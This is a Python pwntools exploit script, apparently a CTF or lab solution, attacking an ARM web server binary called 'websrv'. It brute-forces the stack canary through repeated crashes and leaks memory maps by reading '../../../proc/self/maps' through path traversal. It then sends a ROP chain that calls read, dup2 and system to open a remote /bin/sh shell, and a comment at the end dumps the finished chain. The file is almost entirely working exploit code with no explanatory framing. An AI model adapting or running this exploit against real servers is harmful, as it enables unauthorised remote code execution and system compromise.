#!/usr/bin/env python2

from pwn import *

REMOTE = "192.168.100.2"

maps = None

def bruteforce_canary():
    pre_pad = cyclic(0x1000 - 40)

    cookie = ""
    for i in range(4):
        for i in range(0, 256):
            crashed = crash(pre_pad + cookie + p8(i))
            if not crashed:
                cookie += p8(i)
                break

    print "[+] brutefroce cookie: ", cookie.encode("hex")
    assert(not crash(pre_pad + cookie))

    return cookie

def request(payload, io, path="/"):
    pad = "GET " + path + " HTTP/1.1\r\nContent-Length: " 
    pad += str(len(payload)) + "\r\n\r\n" + payload
    io.send(pad)
    io.readuntil("Content-Length: ")
    num = io.readuntil("\r").strip()


def crash(payload):
    crashed = False
    io = remote("192.168.100.2", 80)
    try:
        request(payload, io)
        request("A", io)
    except:
        crashed = True

    io.close()
    return crashed

def leak_libc_base(pre_pad, io):
    payload = pre_pad
    payload += "$" * (0x2c - 4)

    rop = ROP(binary)
    rop.puts(binary.got["memcpy"])
    print rop.dump()

    payload += rop.chain()
    io.send(payload)
    data = io.recvrepeat(timeout=1)
    print len(data)
    print data.encode("hex")

def leak(io, path="../../../proc/self/maps"):
    request("AAAA", io, path)
    data = io.recvrepeat(0.2)

    maps = {}
    for start, end, prot, name in re.findall('([a-f0-9]+)-([a-f0-9]+) (...)p [^\n]* ([^\s\n]+)\n', data):
        name = name.split('/')[-1]
        if name == '0':
            continue
        elif '[' == name[0]:
            name = name[1:-1]
        elif 'rw-' == prot:
            name += '.bss'
        elif 'r--' == prot:
            name += '.rodata'
        if not name in maps:
            maps[name] = int(start, 16)

    return maps


if __name__ == "__main__":
    binary = ELF("./websrv")
    libc = ELF("./libc.so.6")

    context.arch = "arm"
    context.log_level = "error"
    cookie = bruteforce_canary()
    print "[+] Get cookie: ", cookie.encode("hex")

    context.log_level = "info"

    io = remote(REMOTE, 80)
    maps = leak(io)
    bin_base = maps["websrv_nop"]
    libc_base = maps["libc-2.13.so"]
    stack_base = maps["stack"]

    print "[+] leak: bin_base 0x%x libc_base 0x%x, stack_base 0x%x " \
            %( bin_base, libc_base, stack_base)
    
    binary.address = bin_base
    libc.address = libc_base


    payload = "$" * (0x1000 - 40)
    payload += cookie
    payload += cyclic(cyclic_find(p32(0x6161616a)))
    

    cmd = "/bin/sh\x00"
    
    rop = ROP(libc)
    rop.call(libc.symbols["read"], (4, maps["websrv_nop.bss"], len(cmd) + 1))
    rop.call(libc.symbols["dup2"], (4, 0))
    rop.call(libc.symbols["dup2"], (4, 1))
    rop.call(libc.symbols["dup2"], (4, 2))
    rop.call(libc.symbols["system"], (maps["websrv_nop.bss"],))
    pad = rop.chain()
    print rop.dump()
    
    payload += pad
    request(payload, io)

    io.sendline(cmd)

    io.interactive() 
    io.close()

    '''
    The ROP chain looks like:
    0x0000:       0x76ec49cd pop {r0, r1, r2, r3, r5, pc}
    0x0004:              0x4
    0x0008:       0x76fd0000
    0x000c:              0x9
    0x0010:           'eaaa' <pad>
    0x0014:       0x76f4afc0
    0x0018:       0x76f52b81 blx r5; pop {r4, r5, r6, pc}
    0x001c:           'haaa' <pad>
    0x0020:           'iaaa' <pad>
    0x0024:           'jaaa' <pad>
    0x0028:       0x76ec49cd pop {r0, r1, r2, r3, r5, pc}
    0x002c:              0x4
    0x0030:              0x0
    0x0034:           'naaa' <pad>
    0x0038:           'oaaa' <pad>
    0x003c:       0x76f4b580
    0x0040:       0x76f52b81 blx r5; pop {r4, r5, r6, pc}
    0x0044:           'raaa' <pad>
    0x0048:           'saaa' <pad>
    0x004c:           'taaa' <pad>
    0x0050:       0x76ec49cd pop {r0, r1, r2, r3, r5, pc}
    0x0054:              0x4
    0x0058:              0x1
    0x005c:           'xaaa' <pad>
    0x0060:           'yaaa' <pad>
    0x0064:       0x76f4b580
    0x0068:       0x76f52b81 blx r5; pop {r4, r5, r6, pc}
    0x006c:           'caab' <pad>
    0x0070:           'daab' <pad>
    0x0074:           'eaab' <pad>
    0x0078:       0x76ec49cd pop {r0, r1, r2, r3, r5, pc}
    0x007c:              0x4
    0x0080:              0x2
    0x0084:           'iaab' <pad>
    0x0088:           'jaab' <pad>
    0x008c:       0x76f4b580
    0x0090:       0x76f52b81 blx r5; pop {r4, r5, r6, pc}
    0x0094:           'maab' <pad>
    0x0098:           'naab' <pad>
    0x009c:           'oaab' <pad>
    0x00a0:       0x76f25885 pop {r0, pc}
    0x00a4:       0x76fd0000
    0x00a8:       0x76ef07e9
    '''
